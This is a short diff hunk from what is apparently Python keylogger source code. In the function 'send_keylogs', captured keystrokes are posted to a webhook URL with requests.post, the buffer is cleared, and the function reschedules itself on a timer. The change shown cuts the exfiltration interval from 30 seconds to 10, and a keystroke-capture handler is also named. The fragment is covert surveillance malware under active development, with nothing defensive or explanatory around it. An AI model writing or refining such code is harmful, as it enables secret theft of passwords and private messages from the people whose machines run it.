@@ -19,7 +19,7 @@ def send_keylogs():
         }
         requests.post(WEBHOOK_URL, data=payload)
         keylogs = []
-    threading.Timer(30, send_keylogs).start()
+    threading.Timer(10, send_keylogs).start()
 
 
 def capture_keystrokes(event):
